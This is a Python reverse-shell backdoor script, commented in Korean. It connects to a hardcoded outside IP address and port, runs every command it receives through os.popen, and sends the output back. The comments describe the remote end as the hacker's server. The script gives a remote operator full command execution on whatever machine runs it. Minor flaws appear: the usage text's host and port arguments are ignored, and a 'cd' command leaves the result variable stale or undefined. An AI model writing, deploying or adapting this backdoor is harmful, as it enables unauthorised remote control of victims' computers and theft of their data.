import os, socket, sys

def usage(): # help
    print('''
    tcp_reverse_backdoor.py <host> <port>
    '''
    )
    exit()

ip = '182.230.134.78'
port = 12345

with socket.socket() as s:
    addr = (ip, port)             #ip, port번호롤 인자로 받아 프로그램 실행
    s.connect(addr)                                    #입력받은 ip, port번호로 해커 서버와 연결
    s.send('''
###########################
# tcp_reverse_backdoor.py #
###########################
>>'''.encode())                                       #맨 처음 안내메세지를 보냄

    while True:
        data = s.recv(1024).decode().lower()          #서버로부터 메세지를 받아 data에 저장

        if "q" == data:                               #서버로부터 q를 받으면 프로그램 종료
            # 프로그램 종료
            exit()
        else:
            if data.startswith("cd"): # cd gasbugs    #cd를 받으면 디렉터리 변경
                # 디렉터리 변경
                os.chdir(data[3:].replace('\n',''))
            else :
                result = os.popen(data).read()        #서버로부터 받은 명령어로 cmd조작
            result = result + "\n>>"
            s.send(result.encode())                   #cmd 명령어 결과 메세지를 다시 서버로 보냄
    










        
